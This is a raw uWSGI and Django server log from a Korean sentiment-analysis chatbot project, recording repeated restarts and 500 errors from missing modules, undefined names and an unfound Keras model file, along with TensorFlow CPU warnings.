  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from nlp import naverNlp
ModuleNotFoundError: No module named 'nlp'
[pid: 11031|app: 0|req: 3/3] 192.241.227.83 () {36 vars in 502 bytes} [Mon Aug 24 08:06:15 2020] GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f => generated 130033 bytes in 75 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:09:53 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x557ecb1f1cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x557ecb1f1cf0 pid: 11088 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11088, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 37, in webhook
    return welcome()
  File "./haniumapp/views.py", line 44, in welcome
    text,score = predict_pos_text('3D만 아니었어도 별 다섯 개 줬을텐데.. 왜 3D로 나와서 제 심기를 불편하게 하죠??')
NameError: name 'predict_pos_text' is not defined
[pid: 11088|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Mon Aug 24 08:09:59 2020] POST /webhook/ => generated 66513 bytes in 54 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:12:00 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55b8a54c4cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55b8a54c4cf0 pid: 11119 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11119, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 37, in webhook
    return welcome()
  File "./haniumapp/views.py", line 44, in welcome
    text,score = naverNlp.predict_pos_text('3D만 아니었어도 별 다섯 개 줬을텐데.. 왜 3D로 나와서 제 심기를 불편하게 하죠??')
NameError: name 'naverNlp' is not defined
[pid: 11119|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Mon Aug 24 08:12:06 2020] POST /webhook/ => generated 66499 bytes in 53 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:14:35 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55f467c11cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55f467c11cf0 pid: 11152 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11152, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp
ImportError: cannot import name 'naverNlp'
[pid: 11152|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Mon Aug 24 08:14:39 2020] POST /webhook/ => generated 114319 bytes in 76 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:17:40 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x559eca362d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x559eca362d00 pid: 11194 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11194, cores: 1)
2020-08-24 08:17:45.627273: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-24 08:17:45.627309: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:18:08.352922: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-24 08:18:08.352953: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-24 08:18:08.352969: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-24 08:18:08.353190: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-24 08:18:08.379863: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199825000 Hz
2020-08-24 08:18:08.380273: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x559ecdd8c6d0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-24 08:18:08.380290: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-24 08:18:08.682065: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:18:08.683490: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:18:08.684981: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:18:11 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.102.6.201) !!!
Mon Aug 24 08:18:11 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.102.6.201)
OSError: write error
[pid: 11194|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Mon Aug 24 08:17:45 2020] POST /webhook/ => generated 32611 bytes in 26749 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:18:55.401084: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:18:55.402500: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:18:55.403934: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:18:58 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 223.194.169.151) !!!
Mon Aug 24 08:18:58 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET / (223.194.169.151)
OSError: write error
[pid: 11194|app: 0|req: 2/2] 223.194.169.151 () {52 vars in 923 bytes} [Mon Aug 24 08:18:34 2020] GET / => generated 32611 bytes in 24364 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:19:17.966441: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:19:17.967885: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:19:17.969242: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:19:21 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 223.194.169.151) !!!
Mon Aug 24 08:19:21 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET / (223.194.169.151)
OSError: write error
[pid: 11194|app: 0|req: 3/3] 223.194.169.151 () {50 vars in 873 bytes} [Mon Aug 24 08:18:58 2020] GET / => generated 32611 bytes in 22576 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:19:40.896283: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:19:40.897714: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:19:40.899078: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:19:44 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.102.6.201) !!!
Mon Aug 24 08:19:44 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.102.6.201)
OSError: write error
[pid: 11194|app: 0|req: 4/4] 66.102.6.201 () {42 vars in 540 bytes} [Mon Aug 24 08:19:21 2020] POST /webhook/ => generated 32611 bytes in 22935 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:20:25.626665: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:20:25.628107: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:20:25.629473: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
